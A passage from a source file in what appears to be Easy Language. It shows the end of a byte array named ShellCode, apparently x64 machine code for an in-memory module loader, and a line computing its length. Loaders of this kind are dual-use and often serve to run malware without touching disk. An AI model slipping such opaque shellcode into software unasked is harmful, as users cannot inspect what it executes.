92, 15, 132, 201, 0, 0, 0, 68, 15, 183, 192, 51, 210, 235, 35, 76, 139, 69, 103, 73, 141, 80, 2, 72, 3, 208, 15, 132, 180, 0, 0, 0, 72, 141, 77, 247, 255, 85, 127, 72, 139, 77, 111, 72, 141, 85, 247, 69, 51, 192, 76, 141, 77, 119, 65, 255, 212, 72, 139, 69, 119, 72, 133, 192, 15, 132, 138, 0, 0, 0, 72, 255, 195, 73, 137, 4, 62, 72, 139, 4, 222, 72, 141, 60, 221, 0, 0, 0, 0, 72, 133, 192, 116, 8, 72, 139, 77, 111, 51, 210, 235, 143, 72, 139, 125, 127, 65, 139, 71, 20, 73, 131, 199, 20, 76, 139, 69, 103, 133, 192, 15, 133, 23, 255, 255, 255, 76, 139, 117, 231, 65, 139, 93, 40, 186, 1, 0, 0, 0, 77, 137, 69, 48, 51, 201, 76, 139, 69, 103, 73, 3, 216, 255, 211, 133, 192, 117, 50, 76, 139, 69, 103, 51, 210, 51, 201, 255, 211, 131, 248, 1, 117, 35, 72, 139, 77, 111, 65, 255, 214, 133, 192, 117, 24, 65, 185, 0, 128, 0, 0, 76, 141, 69, 199, 72, 141, 85, 103, 72, 199, 193, 255, 255, 255, 255, 255, 85, 239, 76, 139, 69, 103, 76, 139, 188, 36, 136, 0, 0, 0, 76, 139, 172, 36, 144, 0, 0, 0, 73, 139, 192, 72, 129, 196, 152, 0, 0, 0, 65, 94, 65, 92, 95, 94, 91, 93, 195)
                                                变量 CodeSize <类型 = 整数>
                                                CodeSize = ShellCode.取字节集长度 ()
